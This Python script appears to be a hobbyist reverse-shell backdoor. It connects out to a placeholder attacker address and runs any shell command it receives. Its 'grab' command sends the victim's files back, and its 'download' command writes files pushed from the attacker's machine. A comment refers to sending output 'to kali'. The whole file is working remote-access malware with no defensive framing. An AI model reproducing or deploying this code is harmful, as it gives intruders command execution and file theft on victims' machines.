import socket
import os
import subprocess

def load(s, command):
    download, path = command.decode().split('*')
    f = open(path,'wb')
    while True:
        bits = s.recv(1024)
        if bits.endswith("FINI".encode()):
            f.write(bits[:-4])
            f.close()
            break
        if "File not found".encode() in bits:
            break
        f.write(bits)

def transfer(s, path):
    if os.path.exists(path): #check if the requested file exists
        f = open(path, 'rb')
        packet = f.read(1024) #read file in chunks of 1024 kb
        while len(packet) > 0: #loop until end of the file is reached
            s.send(packet) #send current packet
            packet = f.read(1024) #update packet value to remaning packet
        s.send("DONE".encode()) #once completed tell the server
    else:
        s.send('File not found'.encode())
def connect():
    s = socket.socket()
    s.connect(('IP',PORT))
    while True:
        command = s.recv(1024)
        print(command)
        if "exit" in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab, path = command.decode().split('*') # if grab is found in the Command
            #split the string at the asterik in to grab and the path of the file
            try:
                transfer(s, path) # try to transfer the path file through the TCP socket
            except:
                pass #raise an exception if not possible, so the script doesn't crash
        elif 'download' in command.decode().strip():
            load(s, command)
        else:
            #Popen command creates a new process, the shell value
            #helps specify to run in shell
            #we then return the output in a pipe to be able to read it
            #then we pipe standard output, error, and output
            CMD = subprocess.Popen(command.decode(),shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            s.send(CMD.stdout.read()) #read out output to kali

def main():
    connect()
main()
